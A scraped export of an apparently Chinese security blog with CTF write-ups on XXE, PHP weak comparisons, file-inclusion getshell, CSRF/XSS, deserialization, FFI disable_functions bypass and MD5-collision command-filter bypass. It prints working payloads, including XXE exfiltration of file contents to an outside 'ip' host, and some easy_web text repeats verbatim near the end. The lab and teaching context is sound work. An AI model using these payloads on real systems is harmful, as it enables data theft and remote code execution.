//需要加LIBXML_NOENT参数,不然无法导入外部实体。 但是我在我的服务器上这样配置了还是无法导入外部实体，应该还有一些配置会影响, 本应来说xxe应该很少见了,但是护网面试的时候面试官还是问了我是否学过xxe,所以还是学习一下。 工具介绍 网上已经有可以自动检测XXE漏洞的开源工具:xxeinjector 使用介绍: https://www.freebuf.com/sectool/170971.html XML函数loadXML： &lt;?php $data = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($data); print_r($dom); SimpleXMLElement: &lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = new SimpleXMLElement($data); echo $xml-&gt;name; simplexml_load_string: &lt;?php $data = file_get_contents(&#39;php://input&#39;); $xml = simplexml_load_string($data); echo $xml-&gt;name; XXE利用有回显读取本地敏感文件&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 但是如果返回的文件中有一些特殊字符,如&lt;&gt;&amp;””会被当成XML来执行,从而报错,这个时候就需要使用CDATA payload： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 无回显读取本地敏感文件payload: xml.php &lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt; test.dtd &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt; payload： &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt; %remote;%int;%send; ]&gt; 双引号中的%需要编码为&amp;#37 CTF例题[NCTF2019]Fake XML cookbook进去是一个登录框,F12查看源码 function doLogin(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;doLogin.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus); } }); } emm…..JavaScript学得不是很多,看不懂代码,但是可以看出数据是以XML形式传输的,而且数据为: “ + username + ““ + password + “ 抓包也可以看到我们传输的数据 发现他会返回我们的username的值,后台代码大概是echo $xml-&gt;msg 之类的 payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt; [NCTF2019]True XML cookbook还是和上一道题一样的,读取一下flag文件,发现报错 Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:16) in /var/www/html/doLogin.php on line \\31\\ 去读一下doLogin.php 注意: php文件要用php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php 解码一下 &lt;?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = &#39;admin&#39;; //è´¦å· $PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //å¯ç  $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#39;php://input&#39;); try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); }else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); } }catch(Exception $e){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); } header(&#39;Content-Type: text/html; charset=utf-8&#39;); echo $result;Cj8 然后就不知道怎么办了,因为我向找到为什么报错的原因 就去看wp了,结果wp也没有说是为什么报错,我估计是因为没有那个文件 然后wp中写的查看敏感目录/etc/hosts 找到我们所在的网段,进行内网探测 ssrf作为一种攻击手段被用在了xxe上,所以ssrf可以做的xxe也可以去完成","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"极客大挑战","slug":"极客大挑战","date":"2021-02-24T14:42:46.000Z","updated":"2021-03-02T07:18:32.939Z","comments":true,"path":"2021/02/24/极客大挑战/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/24/极客大挑战/","excerpt":"","text":"2020welcome&lt;?php error_reporting(0); if ($_SERVER[&#39;REQUEST_METHOD&#39;] !== &#39;POST&#39;) { header(&quot;HTTP/1.1 405 Method Not Allowed&quot;); exit(); } else { if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;])){ show_source(__FILE__); } else if ($_POST[&#39;roam1&#39;] !== $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) === sha1($_POST[&#39;roam2&#39;])){ phpinfo(); // collect information from phpinfo! } } 数组绕过roam1[]=1&amp;roam2[]=2 myblog知识点 修改PHPSESSION，使$_session[‘password’]为空,绕过== 使用zip://协议包含图片马 打开发现是一个网站,url尝试一下文件包含 利用filter协议读取一下文件 #login &lt;?php require_once(&quot;secret.php&quot;); mt_srand($secret_seed); $_SESSION[&#39;password&#39;] = mt_rand(); ?&gt; #secret &lt;?php $secret_seed = mt_rand(); ?&gt; #admin/user //登录后的url中有该路径 &lt;?php error_reporting(0); session_start(); $logined = false; if (isset($_POST[&#39;username&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;username&#39;] === &quot;Longlone&quot; and $_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;]){ // No one knows my password, including myself $logined = true; $_SESSION[&#39;status&#39;] = $logined; } } if ($logined === false &amp;&amp; !isset($_SESSION[&#39;status&#39;]) || $_SESSION[&#39;status&#39;] !== true){ echo &quot;&lt;script&gt;alert(&#39;username or password not correct!&#39;);window.location.href=&#39;index.php?page=login&#39;;&lt;/script&gt;&quot;; die(); } ?&gt; &lt;?php if(isset($_FILES[&#39;Files&#39;]) and $_SESSION[&#39;status&#39;] === true){ $tmp_file = $_FILES[&#39;Files&#39;][&#39;name&#39;]; $tmp_path = $_FILES[&#39;Files&#39;][&#39;tmp_name&#39;]; if(($extension = pathinfo($tmp_file)[&#39;extension&#39;]) != &quot;&quot;){ $allows = array(&#39;gif&#39;,&#39;jpeg&#39;,&#39;jpg&#39;,&#39;png&#39;); if(in_array($extension,$allows,true) and in_array($_FILES[&#39;Files&#39;][&#39;type&#39;],array_map(function($ext){return &#39;image/&#39;.$ext;},$allows),true)){ $upload_name = sha1(md5(uniqid(microtime(true), true))).&#39;.&#39;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#39;Update image -&gt; assets/img/upload/${upload_name}&#39;) &lt;/script&gt;&quot;; } else { echo &quot;&lt;script&gt;alert(&#39;Update illegal! Only allows like \\&#39;gif\\&#39;, \\&#39;jpeg\\&#39;, \\&#39;jpg\\&#39;, \\&#39;png\\&#39; &#39;) &lt;/script&gt;&quot;; } } } ?&gt; &lt;script&gt; document.write(new Date().getFullYear()) &lt;/script&gt;, admin/user.php有两段，一段是关于登陆的逻辑，另外一个是关于文件上传的逻辑。 PHP if ($_POST[&#39;username&#39;] === &quot;Longlone&quot; and $_POST[&#39;password&#39;] == $_SESSION[&#39;password&#39;]) 可见这里的比较密码用的是PHP弱类型比较，我们在把session删掉，这样 $_SESSION[&#39;password&#39;] 变成了Null，再将密码置为空，即可通过弱类型比较成功登录： 当然PHPSESSION不一定要置空,随便输入一个PHPSESSION就可以了,让我们的session文件不存在,我们的$_SESSION[‘password’]也就为空了 然后成功登录到了另一个界面 阅读源码发现有个上传 这里就是一个白名单机制，结合前面的文件包含，我们很容易想到利用 图片马+文件包含来getshell 但问题来了，我们上传的文件 路径为 ./assets/img/upload/xxx.png 然后我们包含的话，后面会给我们加上 .php 就不能成功包含了，这里我们可以用zip:// 伪协议。zip:// 伪协议的格式为： zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 我们构造一个 一句话的shell.php ，然后压缩成zip，改一下后缀名（这里不影响zip伪协议）改成png 然后我们上传，最后包含成功 getshell page=zip:///var/www/html/assets/img/upload/ce999132d18ebb87d093084b730adb3f05b22424.png%23shell 拼接之后相当于就是包含了 shell.php。 Cross扫一下目录,发现robots.txt 访问一下这几个目录 flagshop题目需要我们花钱去买flag,但是我们只有11块钱,得想办法让自己的钱变多,然后网站有一个转账功能,可以尝试csrf 这里抓包 是post的请求,不能直接在url中构造csrf,得利用javascript提交我们的poc,先用burp生成poc, 然后加一点JavaScript让他自动提交 ction=&quot;http://60f43ecd-62a6-477c-99c0-ae67e9e12ad6.node3.buuoj.cn/transfer.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;Pp1ove&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;messages&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 准备使用报告模块发送我们的xss链接: 比较md5的前五位,直接爆破就行,copy一下网上的脚本 from multiprocessing.dummy import Pool as tp import hashlib knownMd5 = &#39;b5ffe&#39; #已知的md5明文 def md5(text): return hashlib.md5(str(text).encode(&#39;utf-8&#39;)).hexdigest() def findCode(code): key = code.split(&#39;:&#39;) start = int(key[0]) end = int(key[1]) for code in range(start, end): if md5(code)[0:5] == knownMd5: print code break list=[] for i in range(3): #这里的range(number)指爆破出多少结果停止 list.append(str(10000000*i) + &#39;:&#39; + str(10000000*(i+1))) pool = tp() #使用多线程加快爆破速度 pool.map(findCode, list) pool.close() pool.join() 然后提交报告,在报告内容中写 &lt;script&gt;window.location.href=&quot;https://yourip/csrf.php&quot;&lt;/script&gt; 但是没有成功,因为是在buu上做的,这道题也是0解,估计是环境出了问题,就不管了 Greatphp知识点 利用原生类绕过md5=== 利用取反符号~取代引号绕过preg_match ?&gt;&lt;?=绕过报错信息,执行php代码,以及&lt;?=和&lt;?php相等 &lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } if (isset($_GET[&#39;great&#39;])){ unserialize($_GET[&#39;great&#39;]); } else { highlight_file(__FILE__); } ?&gt; 前置知识: exception::toString https://www.php.net/manual/zh/exception.tostring.php 因为 (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover) 在同一行,所以他们的报错信息是相同的, Error: payload in /usercode/file.php:2 Stack trace: #0 {main} Error: payload in /usercode/file.php:2 Stack trace: #0 {main} 即可以绕过md5和sha1函数 然后我们不能使用 括号,无法调用函数,所以可以尝试直接使用include “/flag” ，因为过滤了引号,我们使用url取反绕过， &lt;?php $str=&quot;/flag&quot;; $b=urlencode(~$str); echo $b; //得到b为%D0%99%93%9E%98 payload： &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } } } $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; /* 或使用[~(取反)][!%FF]的形式， 即: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;; $str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; */ $a= new SYCLOVER(); $b= new Exception($str,1);$c= new Exception($str,2); echo $b; echo &quot;&lt;/br&gt;&quot;; echo $c; $a-&gt;syc=$b; $a-&gt;lover=$c; echo urlencode(serialize($a)); 这里 $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; 中为什么要在前面加上一个 ?&gt; 呢？因为Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ” 因为我们需要报错信息相同,而报错时会所以还得让 $b=new Exception($str,1);$c= new Exception($str,2);位于同一排 若我们不位于同一排,报错的字符串是不同的 FighterFightsInvincibly知识点 create_function代码注入 FFI绕过disable_function() create_function代码注入: https://blog.51cto.com/lovexm/1743442 payload: ?fighter=create_function&amp;fights=&amp;invincibly=;}phpinfo();/* 然后执行系统函命令,发现没有反应，可能是设置了disable_function 根据题目 可能是用FFI绕过disable_function copy一下师傅的 PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。 我们首先尝试调用C库的system函数： PHP /?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;ls / &gt; res.txt&quot;);echo file_get_contents(&quot;res.txt&quot;);/* C库的system函数执行是没有回显的，所以我么只能尝试写文件。但是执行后却发现有任何结果，可能是我们没有写文件的权限。所以，我们还要找别的C库函数。 C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现： C FILE *popen(const char* command, const char* type); popen()函数会调用fork()产生子进程，然后从子进程中调用/bin/sh -c 来执行参数 command 的指令。 参数 type 可使用 “r”代表读取，”w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。 所以，我们还可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数。payload如下： PHP /?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);}$ffi-&gt;pclose($o);echo hex2bin($d);/* 成功执行命令： 参考链接:https://whoamianony.top/2020/10/26/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20WriteUp/","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ctfshow-xss","slug":"ctfshow-xss","date":"2021-02-24T04:23:28.000Z","updated":"2021-02-24T15:33:10.358Z","comments":true,"path":"2021/02/24/ctfshow-xss/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/24/ctfshow-xss/","excerpt":"","text":"web316反射性xss, 在xss测试平台（https://xss.pt/xss.php）获取flag web317/318/319317屏蔽了script标签,318屏蔽了img标签 但是还是有其他标签可以弹窗，如标签,详细可以看:https://xz.aliyun.com/t/4067#toc-3 https://www.freebuf.com/articles/web/157589.html 具体做题就用平台中没有script和img标签的代码就可以了 但是317没出,可能是平台的问题 web320/321/322测了半天都没成功,原来是过滤了空格 用tab代替空格就可以了 web323","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"安洵杯","slug":"安洵杯","date":"2021-02-20T07:00:51.000Z","updated":"2021-02-23T13:47:03.255Z","comments":true,"path":"2021/02/20/安洵杯/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/20/安洵杯/","excerpt":"","text":"[安洵杯 2018][安洵杯 2019]easy_web知识点 可控img，获得源码 强类型比较绕过 获取源码进去后查看源码等，都没有想要的东西，然后发现有两个参数，img和cmd，以为只是一个简单的命令执行，一直给cmd传参，发现返回一直错误，去网上找大佬们的wp，才知道这里疑似利用了一个ssrf漏洞，他利用img读取本地的文件，然后显示在左上角，我们可以控制img的参数，把它修改成我们需要读取的文件 这里首先要搞懂img参数的加密方式，本以为只是一个简单的base64加密，解密后发现并不是， 两次base64解码后得到： 这里很明显是一个Hex加密，解密后为：555.png， 同理，当我们想要读取index.php文件时，先把index.php转换成16进制，再进行两次base64编码，得到index.php源码 解码： &lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(&#39;content-type:text/html;charset=utf-8&#39;); $cmd = $_GET[&#39;cmd&#39;]; if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;]))); $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file); if (preg_match(&quot;/flag/i&quot;, $file)) { echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;; die(&quot;xixi～ no flag&quot;); } else { $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;; } echo $cmd; echo &quot;&lt;br&gt;&quot;; if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) { echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; } else { if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) { echo `$cmd`; } else { echo (&quot;md5 is funny ~&quot;); } } ?&gt; &lt;html&gt; &lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } &lt;/style&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 分析一下这串代码，首先我们需要传进去一个cmd参数，然后正则匹配，cmd不能等于ls，cat等，但是我们可以使用ca\\t,l\\s等来执行命令，绕过后执行： if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) { echo \\`$cmd\\`; } else { echo (&quot;md5 is funny ~&quot;); } 这里是一个哈希比较缺陷，我所知道的只有数组绕过和常规的0e绕过，但试过之后发现都不行，这题用的是强类型碰撞,至于为什么前两种不行，我认为oe绕过不行是因为这里用的是===，而数组不行使因为数组没法转换为字符串，无法绕过(string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] md5强类型碰撞$Param1=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;; $Param2=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;; $data1=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x07\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\xf1\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\x72\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\x34\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\x28\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\xab\\x6f\\xf7\\x2a\\x70&quot;; $data2=&quot;\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x87\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\x71\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\xf2\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\xb4\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\xa8\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\x2b\\x6f\\xf7\\x2a\\x70&quot;; a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 这里过滤了大部分命令执行的语句 if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\ 这里想到 linux命令中可以加\\，所以甚至可以ca\\t /fl\\ag 查看当前目录有没有flag: 并没有。。 去根目录下找flag： 发现flag，读取： 禁用cat之后，cmd=/bin/c\\at%20/flag 看网上还有一种方法读取flag： sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 参考链接 https://www.jianshu.com/p/21e3e1f74c08 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 这里过滤了大部分命令执行的语句 if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\ 这里想到 linux命令中可以加\\，所以甚至可以ca\\t /fl\\ag 查看当前目录有没有flag: 并没有。。 去根目录下找flag： 发现flag，读取： 禁用cat之后，cmd=/bin/c\\at%20/flag 看网上还有一种方法读取flag： sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 ​ 得到flag 不是文件上传先试了下文件上传,发现好像真的没有问题, 然后在index.html最下方有提示，可以在github上下载源码进行审计。 在helper.php中存在读取文件内容函数，并且可以使用destruct函数自动触发。 public function view_files($path){ if ($this-&gt;ifview == False){ return False; //The function is not yet perfect, it is not open yet. } $content = file_get_contents($path); echo $content; } function __destruct(){ # Read some config html $this-&gt;view_files($this-&gt;config); } 